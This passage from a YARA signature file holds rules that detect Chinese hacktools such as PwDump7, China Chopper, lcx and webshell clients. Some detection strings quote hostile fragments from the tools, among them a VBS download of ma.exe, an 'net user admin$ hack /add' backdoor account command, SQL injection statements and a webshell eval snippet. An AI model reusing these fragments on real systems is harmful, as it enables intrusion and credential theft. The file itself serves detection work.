= \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker_exp_ms11011\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"\\\\i386\\\\Hello.pdb\" ascii\n        $s1 = \"OS not supported.\" fullword ascii\n        $s2 = \".Rich5\" fullword ascii\n        $s3 = \"Not supported.\" fullword wide\n        $s5 = \"cmd.exe\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule ChineseHacktools_DLL_passive_privilege_escalation_ws2help\n{\n    meta:\n        description = \"Chinese hacktool (file: ws2help.dll)\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker_DLL_passive_privilege_escalation_ws2help\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"PassMinDll.dll\" fullword ascii\n        $s1 = \"\\\\ws2help.dll\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 30KB and all of them\n}\n\nrule ChineseHacktools_Webshell\n{\n    meta:\n        description = \"Chinese hacktool (file: Webshell.exe)\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker_Webshell\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"Windows NT users: Please note that having the WinIce/SoftIce\" fullword ascii\n        $s2 = \"Do you want to cancel the file download?\" fullword ascii\n        $s3 = \"Downloading: %s\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 381KB and all of them\n}\n\nrule ChineseHacktools_AspxClient\n{\n    meta:\n        description = \"Chinese hacktool (file: AspxClient.exe)\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker_AspxClient\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"\\\\tools\\\\hashq\\\\hashq.exe\" fullword wide\n        $s2 = \"\\\\Release\\\\CnCerT.CCdoor.Client.pdb\" fullword ascii\n        $s3 = \"\\\\myshell.mdb\" fullword wide\n        $s4 = \"injectfile\" fullword wide\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 1000KB and 3 of them\n}\n\nrule ChineseHacktools_Fckeditor\n{\n    meta:\n        description = \"Chinese hacktool (file: Fckeditor.exe)\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker_Fckeditor\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"explorer.exe http://user.qzone.qq.com/568148075\" fullword wide\n        $s7 = \"Fckeditor.exe\" fullword wide\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 1340KB and all of them\n}\n\nrule ChineseHacktools_Codeeer_Explorer\n{\n    meta:\n        description = \"Chinese hacktool (file: Codeeer Explorer.exe)\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker_Codeeer_Explorer\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s2 = \"Codeeer Explorer.exe\" fullword wide\n        $s12 = \"webBrowser1_ProgressChanged\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 470KB and all of them\n}\n\nrule ChineseHacktools_SwordHonkerEdition\n{\n    meta:\n        description = \"Chinese hacktool (file: SwordHonkerEdition.exe)\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker_SwordHonkerEdition\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"\\\\bin\\\\systemini\\\\MyPort.ini\" fullword wide\n        $s1 = \"PortThread=200 //\" fullword wide\n        $s2 = \" Port Open -> \" fullword wide\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 375KB and all of them\n}\n\nrule ChineseHacktools_HASH_PwDump7\n{\n    meta:\n        description = \"Chinese hacktool (file: PwDump7.exe)\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker_HASH_PwDump7\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"%s\\\\SYSTEM32\\\\CONFIG\\\\SAM\" fullword ascii\n        $s2 = \"No Users key!\" fullword ascii\n        $s3 = \"NO PASSWORD*********************:\" fullword ascii\n        $s4 = \"Unable to dump file %S\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 380KB and all of them\n}\n\nrule ChineseHacktools_ChinaChopper\n{\n    meta:\n        description = \"Chinese hacktool (file: ChinaChopper.exe)\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker_ChinaChopper\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"$m=get_magic_quotes_gpc();$sid=$m?stripslashes($_POST[\\\"z1\\\"]):$_POST[\\\"z1\\\"];$u\" wide\n        $s3 = \"SETP c:\\\\windows\\\\system32\\\\cmd.exe \" fullword wide\n        $s4 = \"Ev al (\\\"Exe cute(\\\"\\\"On+Error+Resume+Next:%s:Response.Write(\\\"\\\"\\\"\\\"->|\\\"\\\"\\\"\\\"\" wide\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 2000KB and 1 of them\n}\n\nrule ChineseHacktools_dedecms5_7\n{\n    meta:\n        description = \"Chinese hacktool (file: dedecms5.7.exe)\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker_dedecms5_7\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"/data/admin/ver.txt\" fullword ascii\n        $s2 = \"SkinH_EL.dll\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 830KB and all of them\n}\n\nrule ChineseHacktools_Alien_ee\n{\n    meta:\n        description = \"Chinese hacktool (file: ee.exe)\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker_Alien_ee\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"GetIIS UserName and PassWord.\" fullword wide\n        $s2 = \"Read IIS ID For FreeHost.\" fullword wide\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 50KB and all of them\n}\n\nrule ChineseHacktools_Happy_Happy\n{\n    meta:\n        description = \"Chinese hacktool (file: Happy.exe)\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker_Happy_Happy\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"<form.*?method=\\\"post\\\"[\\\\s\\\\S]*?</form>\" fullword wide\n        $s2 = \"domainscan.exe\" fullword wide\n        $s3 = \"http://www.happysec.com/\" fullword wide\n        $s4 = \"cmdshell\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 655KB and 2 of them\n}\n\nrule ChineseHacktools_T00ls_Lpk_Sethc_v3_0\n{\n    meta:\n        description = \"Chinese hacktool (file: T00ls Lpk Sethc v3.0.exe)\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker_T00ls_Lpk_Sethc_v3_0\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"http://127.0.0.1/1.exe\" fullword wide\n        $s2 = \":Rices  Forum:T00Ls.Net  [4 Fucker Te@m]\" fullword wide\n        $s3 = \"SkinH_EL.dll\" fullword wide\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 1000KB and 2 of them\n}\n\nrule ChineseHacktools_NetFuke_NetFuke\n{\n    meta:\n        description = \"Chinese hacktool (file: NetFuke.exe)\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker_NetFuke_NetFuke\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"Mac Flood: Flooding %dT %d p/s \" fullword ascii\n        $s2 = \"netfuke_%s.txt\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 1840KB and all of them\n}\n\nrule ChineseHacktools_ManualInjection\n{\n    meta:\n        description = \"Chinese hacktool (file: ManualInjection.exe)\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker_ManualInjection\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"http://127.0.0.1/cookie.asp?fuck=\" fullword ascii\n        $s16 = \"http://Www.cnhuker.com | http://www.0855.tv\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 3000KB and all of them\n}\n\nrule ChineseHacktools_CnCerT_CCdoor_CMD\n{\n    meta:\n        description = \"Chinese hacktool (file: CnCerT.CCdoor.CMD.dll)\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker_CnCerT_CCdoor_CMD\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s2 = \"CnCerT.CCdoor.CMD.dll\" fullword wide\n        $s3 = \"cmdpath\" fullword ascii\n        $s4 = \"Get4Bytes\" fullword ascii\n        $s5 = \"ExcuteCmd\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 22KB and all of them\n}\n\nrule ChineseHacktools_termsrvhack\n{\n    meta:\n        description = \"Chinese hacktool (file: termsrvhack.dll)\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker_termsrvhack\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"The terminal server cannot issue a client license.  It was unable to issue the\" wide\n        $s6 = \"%s\\\\%s\\\\%d\\\\%d\" fullword wide\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 1052KB and all of them\n}\n\nrule ChineseHacktools_IIS6_iis6\n{\n    meta:\n        description = \"Chinese hacktool (file: iis6.com)\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker_IIS6_iis6\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"GetMod;ul\" fullword ascii\n        $s1 = \"excjpb\" fullword ascii\n        $s2 = \"LEAUT1\" fullword ascii\n        $s3 = \"EnumProcessModules\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 50KB and all of them\n}\n\nrule ChineseHacktools_struts2_catbox\n{\n    meta:\n        description = \"Chinese hacktool (file: catbox.exe)\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker_struts2_catbox\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s6 = \"'Toolmao box by gainover www.toolmao.com\" fullword ascii\n        $s20 = \"{external.exeScript(_toolmao_bgscript[i],'javascript',false);}}\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 8160KB and all of them\n}\n\nrule ChineseHacktools_getlsasrvaddr\n{\n    meta:\n        description = \"Chinese hacktool (file: getlsasrvaddr.exe - WCE Amplia Security)\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker_getlsasrvaddr\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s8 = \"pingme.txt\" fullword ascii\n        $s16 = \".\\\\lsasrv.pdb\" fullword ascii\n        $s20 = \"Addresses Found: \" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule ChineseHacktools_ms10048_x64_\n{\n    meta:\n        description = \"Chinese hacktool (file: ms10048-x64.exe)\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker_ms10048_x64\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"[ ] Creating evil window\" fullword ascii\n        $s2 = \"[+] Set to %d exploit half succeeded\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 125KB and all of them\n}\n\nrule ChineseHacktools_LogCleaner\n{\n    meta:\n        description = \"Chinese hacktool (file: LogCleaner.exe)\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker_LogCleaner\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s3 = \".exe <ip> [(path]\" fullword ascii\n        $s4 = \"LogCleaner v\" ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 250KB and all of them\n}\n\nrule ChineseHacktools_shell_brute_tool\n{\n    meta:\n        description = \"Chinese hacktool (file: shell_brute_tool.exe)\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker_shell_brute_tool\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"http://24hack.com/xyadmin.asp\" fullword ascii\n        $s1 = \"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 1000KB and all of them\n}\n\nrule ChineseHacktools_hxdef100\n{\n    meta:\n        description = \"Chinese hacktool (file: hxdef100.exe)\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker_hxdef100\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s6 = \"BACKDOORSHELL\" fullword ascii\n        $s15 = \"%tmpdir%\" fullword ascii\n        $s16 = \"%cmddir%\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 200KB and all of them\n}\n\nrule ChineseHacktools_Arp_EMP_v1_0_\n{\n    meta:\n        description = \"Chinese hacktool (file: Arp EMP v1.0.exe)\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker_Arp_EMP_v1_0\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"Arp EMP v1.0.exe\" fullword wide\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 400KB and all of them\n}\n\nrule ChineseHacktools_GetWebShell\n{\n    meta:\n        description = \"Chinese hacktool (file: GetWebShell.exe)\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker_GetWebShell\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"echo P.Open \\\"GET\\\",\\\"http://www.baidu.com/ma.exe\\\",0 >>run.vbs\" fullword ascii\n        $s5 = \"http://127.0.0.1/sql.asp?id=1\" fullword wide\n        $s14 = \"net user admin$ hack /add\" fullword wide\n        $s15 = \";Drop table [hack];create table [dbo].[hack] ([cmd] [image])--\" fullword wide\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 70KB and 1 of them\n}\n\nrule ChineseHacktools_Cracker_SHELL\n{\n    meta:\n        description = \"Chinese hacktool (file: SHELL.exe)\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker_Cracker_SHELL\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"http://127.0.0.1/error1.asp\" fullword ascii\n        $s2 = \"password,PASSWORD,pass,PASS,Lpass,lpass,Password\" fullword wide\n        $s3 = \"\\\\SHELL\" fullword wide\n        $s4 = \"WebBrowser1\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 200KB and all of them\n}\n\nrule ChineseHacktools_MSTSC_can_direct_copy\n{\n    meta:\n        description = \"Chinese hacktool (file: MSTSC_can_direct_copy.EXE)\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker_MSTSC_can_direct_copy\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"srv\\\\newclient\\\\lib\\\\win32\\\\obj\\\\i386\\\\mstsc.pdb\" fullword ascii\n        $s2 = \"Clear Password\" fullword wide\n        $s3 = \"/migrate -- migrates legacy connection files that were created with \" fullword wide\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 600KB and all of them\n}\n\nrule ChineseHacktools_lcx_lcx\n{\n    meta:\n        description = \"Chinese hacktool (file: lcx.exe)\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker_lcx_lcx\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"%s -<listen|tran|slave> <option> [-log logfile]\" fullword ascii\n        $s2 = \"=========== Code by lion & bkbll\" ascii\n        $s3 = \"Welcome to [url]http://www.cnhonker.com[/url] \" ascii\n        $s4 = \"-tran   <ConnectPort> <TransmitHost> <TransmitPort>\" fullword ascii\n        $s5 = \"[+] Start Transmit (%s:%d <-> %s:%d) ......\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 30KB and 1 of them\n}\n\nrule ChineseHacktools_PostgreSQL\n{\n    meta:\n        description = \"Chinese hacktool (file: PostgreSQL.exe)\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker_PostgreSQL\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"&http://192.168.16.186/details.php?id=1\" fullword ascii\n        $s2 = \"PostgreSQL_inject\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 2000KB and all of them\n}\n\nrule ChineseHacktools_WebRobot\n{\n    meta:\n        description = \"Chinese hacktool (file: WebRobot.exe)\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker_WebRobot\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"%d-%02d-%02d %02d^%02d^%02d ScanReprot.htm\" fullword ascii\n        $s2 = \"\\\\log\\\\ProgramDataFile.dat\" fullword ascii\n        $s3 = \"\\\\data\\\\FilterKeyword.txt\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 2000KB and all of them\n}\n\nrule ChineseHacktools_Baidu_Extractor_Ver1_0\n{\n    meta:\n        description = \"Chinese hacktool (file: Baidu_Extractor_Ver1.0.exe)\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker_Baidu_Extractor_Ver1_0\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s3 = \"\\\\Users\\\\Admin\" fullword wide\n        $s11 = \"soso.com\" fullword wide\n        $s12 = \"baidu.com\" fullword wide\n        $s19 = \"cmd /c ping \" fullword wide\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 500KB and all of them\n}\n\nrule ChineseHacktools_FTP_scanning\n{\n    meta:\n        description = \"Chinese hacktool (file: FTP_scanning.exe)\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker_FTP_scanning\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"CNotSupportedE\" fullword ascii\n        $s2 = \"nINet.dll\" fullword ascii\n        $s9 = \"?=MODULE\" fullword ascii\n        $s13 = \"MSIE 6*\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 550KB and all of them\n}\n\nrule ChineseHacktools_dirdown_dirdown\n{\n    meta:\n        description = \"Chinese hacktool (file: dirdown.exe)\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker_dirdown_dirdown\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"\\\\Decompress\\\\obj\\\\Release\\\\Decompress.pdb\" fullword ascii\n        $s1 = \"Decompress.exe\" fullword wide\n        $s5 = \"Get8Bytes\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 45KB and all of them\n}\n\nrule ChineseHacktools_Xiaokui_conversion_tool\n{\n    meta:\n        description = \"Chinese hacktool (file: Xiaokui_conversion_tool.exe)\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker_Xiaokui_conversion_tool\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"update [dv_user] set usergroupid=1 where userid=2;--\" fullword ascii\n        $s2 = \"To.exe\" fullword wide\n        $s3 = \"by zj1244\" ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 240KB and 2 of them\n}\n\nrule ChineseHacktools_GroupPolicyRemover\n{\n    meta:\n        description = \"Chinese hacktool (file: GroupPolicyRemover.exe)\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker_GroupPolicyRemover\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"GP_killer.EXE\" fullword wide\n        $s1 = \"GP_killer Microsoft \" fullword wide\n        $s2 = \"SHDeleteKeyA\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 700KB and all of them\n}\n\nrule ChineseHacktools_WordpressScanner\n{\n    meta:\n        description = \"Chinese hacktool (file: WordpressScanner.exe)\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker_WordpressScanner\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)\" fullword ascii\n        $s1 = \"(http://www.eyuyan.com)\" fullword wide\n        $s2 = \"GetConnectString\" fullword ascii\n        $s4 = \"#if !defined(AFX_RESOURCE_DLL) || defined(AFX_TARG_CHS)\" fullword ascii\n\n    condition:\n        